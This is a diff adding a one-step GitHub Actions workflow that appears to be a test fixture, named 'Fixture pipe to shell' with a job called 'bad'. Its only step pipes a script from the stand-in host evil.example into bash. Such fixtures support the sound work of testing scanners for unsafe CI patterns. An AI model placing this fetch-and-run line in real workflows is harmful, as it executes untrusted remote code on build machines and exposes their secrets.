@@ -1,0 +1,7 @@
+name: Fixture pipe to shell
+on: push
+jobs:
+  bad:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -s https://evil.example/x.sh | bash
